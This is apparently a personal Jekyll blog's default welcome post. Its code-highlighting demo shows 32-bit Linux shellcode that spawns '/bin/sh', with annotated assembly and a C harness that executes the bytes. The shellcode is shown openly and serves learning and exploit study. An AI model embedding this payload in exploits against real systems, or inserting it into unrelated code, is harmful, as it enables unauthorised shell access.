---
layout: post
title:  "Welcome to Jekyll!"
date:   2015-01-02 21:33:20
categories: jekyll update
---
You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.

To add new posts, simply add a file in the `_posts` directory that follows the convention `YYYY-MM-DD-name-of-post.ext` and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.

Jekyll also offers powerful support for code snippets:

{% highlight c %}
char shellcode[] = 

"\x99"                         // cltd   
"\x31\xc0"                     // xor    %eax,%eax
"\x52"                         // push   %edx
"\x68\x6e\x2f\x73\x68"         // push   $0x68732f6e
"\x68\x2f\x2f\x62\x69"         // push   $0x69622f2f
"\x89\xe3"                     // mov    %esp,%ebx
"\x52"                         // push   %edx
"\x53"                         // push   %ebx
"\x89\xe1"                     // mov    %esp,%ecx
"\xb0\x0b"                     // mov    $0xb,%al
"\xcd\x80";                    // int    $0x80

int main() {

    void (*p)();
    p = (void *)&shellcode;
    printf("Lenght: %d\n", strlen(shellcode));
    p();
}
{% endhighlight %}

Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help].

[jekyll]:      http://jekyllrb.com
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-help]: https://github.com/jekyll/jekyll-help
